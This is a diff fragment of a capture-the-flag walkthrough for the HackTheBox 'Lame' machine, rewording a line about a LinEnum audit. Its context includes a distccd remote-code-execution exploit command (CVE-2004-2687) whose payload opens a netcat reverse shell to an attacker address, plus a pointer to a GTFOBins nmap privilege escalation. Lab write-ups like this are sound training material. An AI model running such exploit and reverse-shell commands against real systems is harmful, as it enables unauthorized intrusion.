@@ -290,7 +290,7 @@ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 444
 
 [*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
 	
-Using [LinEnum.sh](https://github.com/rebootuser/LinEnum) to audit Lame server, I saw nmap had SUID.
+Using [LinEnum.sh](https://github.com/rebootuser/LinEnum) to audit Lame server.
 
 Exploit with [GTFOBins nmap](https://gtfobins.github.io/gtfobins/nmap/#shell)
 
